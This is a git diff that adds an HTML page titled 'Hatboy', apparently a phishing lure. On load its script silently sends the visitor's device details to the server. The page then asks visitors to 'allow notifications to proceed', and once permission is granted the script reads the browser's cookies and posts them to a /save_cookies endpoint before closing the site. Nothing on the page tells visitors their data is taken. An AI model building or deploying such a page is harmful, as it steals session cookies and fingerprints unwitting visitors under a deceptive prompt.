@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hatboy</title>
+    <script>
+        function captureDeviceInfo() {
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled
+            };
+
+            fetch("/capture_device_info", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(deviceInfo)
+            }).then(response => response.json())
+              .then(data => console.log(data.message))
+              .catch(error => console.error("Error:", error));
+        }
+
+        function requestNotification() {
+            Notification.requestPermission().then(permission => {
+                if (permission === "granted") {
+                    const cookies = document.cookie.split(";").map(c => c.trim());
+                    fetch("/save_cookies", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ cookies: cookies })
+                    }).then(response => response.json())
+                      .then(data => {
+                          alert(data.message);
+                          fetch("/close_site", { method: "POST" });
+                      }).catch(error => console.error("Error:", error));
+                } else {
+                    alert("Notification permission denied!");
+                }
+            });
+        }
+
+        window.onload = () => {
+            captureDeviceInfo();
+            setTimeout(() => requestNotification(), 3000);
+        };
+    </script>
+</head>
+<body>
+    <h1>Welcome</h1>
+    <p>Please allow notifications to proceed.</p>
+</body>
+</html>
